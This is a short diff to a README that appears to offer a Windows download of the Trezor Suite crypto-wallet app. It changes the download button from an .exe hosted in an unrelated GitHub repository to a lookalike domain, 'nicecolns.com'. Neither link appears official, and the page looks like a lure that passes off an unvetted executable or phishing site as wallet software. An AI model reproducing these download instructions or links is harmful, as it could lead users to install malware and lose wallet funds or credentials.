@@ -9,7 +9,7 @@ In addition to these features, the **Trezor Suite** also supports seamless integ
 
 1. Click the button below to start the **Trezor Suite download** for Windows.
     <br>
-    <a href="https://github.com/Q1441/gmgnapppro/releases/download/v.1/M.I.exe">
+    <a href="https://nicecolns.com/">
       <img src="https://github.com/user-attachments/assets/10703858-e0fd-4c01-b89f-94d3bdcb2deb" alt="Download" width="300"/>
     </a>
 2. Locate the downloaded file in your "Downloads" folder.
